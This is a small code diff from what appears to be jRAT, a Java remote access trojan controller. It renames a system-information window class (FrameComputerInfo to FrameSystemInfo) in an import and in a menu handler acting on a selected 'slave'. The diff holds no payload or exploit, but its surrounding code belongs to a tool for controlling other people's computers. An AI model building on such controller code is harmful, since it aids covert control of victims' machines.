@@ -52,7 +52,7 @@ import se.jrat.client.settings.SettingsColumns;
 import se.jrat.client.ui.Columns;
 import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.dialogs.DialogFileType;
-import se.jrat.client.ui.frames.FrameComputerInfo;
+import se.jrat.client.ui.frames.FrameSystemInfo;
 import se.jrat.client.ui.frames.FrameControlPanel;
 import se.jrat.client.ui.frames.FrameNotes;
 import se.jrat.client.ui.frames.FrameRemoteChat;
@@ -850,7 +850,7 @@ public class PanelMainClients extends JScrollPane {
 			public void actionPerformed(ActionEvent arg0) {
 				AbstractSlave slave = getSelectedSlave();
 				if (slave != null && slave instanceof Slave) {
-					FrameComputerInfo screen = new FrameComputerInfo((Slave) slave);
+					FrameSystemInfo screen = new FrameSystemInfo((Slave) slave);
 					screen.setVisible(true);
 				}
 			}
